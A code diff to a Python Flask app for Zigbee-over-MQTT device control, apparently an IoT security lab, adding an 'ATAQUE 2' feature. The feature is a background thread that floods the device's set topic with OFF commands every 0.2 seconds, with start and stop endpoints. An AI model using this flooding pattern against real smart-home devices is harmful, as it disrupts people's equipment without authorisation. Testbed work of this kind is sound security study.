@@ -26,6 +26,9 @@ PUBLISH_TIMEOUT = float(os.getenv("MQTT_PUBLISH_TIMEOUT", "5"))
 
 MQTT_BUTTON_TOPIC = os.getenv("MQTT_BUTTON_TOPIC", "zigbee2mqtt/0x14b457fffe075dd4")
 
+attack2_active = False
+attack2_thread = None
+
 
 state_lock = threading.Lock()
 runtime_state: dict[str, Any] = {
@@ -370,6 +373,45 @@ def publish_payload(payload: dict[str, Any]) -> tuple[bool, str, bool]:
 def button_single():
     ok, msg, denied = publish_to_topic(MQTT_BUTTON_TOPIC, {"action": "single"})
     handle_result("BOTÓN SINGLE", ok, msg, denied)
+    return redirect(url_for("index"))
+
+
+def attack2_worker():
+    global attack2_active
+
+    add_event("warn", "🚨 ATAQUE 2 INICIADO")
+
+    while attack2_active:
+        try:
+            # Forzamos OFF constantemente
+            publish_to_topic(MQTT_SET_TOPIC, {"state": "OFF"})
+            time.sleep(0.2)  # frecuencia alta (ajustable)
+        except Exception as e:
+            add_event("error", f"Ataque2 error: {e}")
+            break
+
+    add_event("info", "🛑 ATAQUE 2 DETENIDO")
+
+@app.post("/attack2/start")
+def attack2_start():
+    global attack2_active, attack2_thread
+
+    if not attack2_active:
+        attack2_active = True
+        attack2_thread = threading.Thread(target=attack2_worker, daemon=True)
+        attack2_thread.start()
+        flash("ATAQUE 2 ACTIVADO 💥")
+    else:
+        flash("ATAQUE 2 ya activo")
+
+    return redirect(url_for("index"))
+
+
+@app.post("/attack2/stop")
+def attack2_stop():
+    global attack2_active
+    attack2_active = False
+    flash("ATAQUE 2 DESACTIVADO 🛑")
     return redirect(url_for("index"))
 
 if __name__ == "__main__":
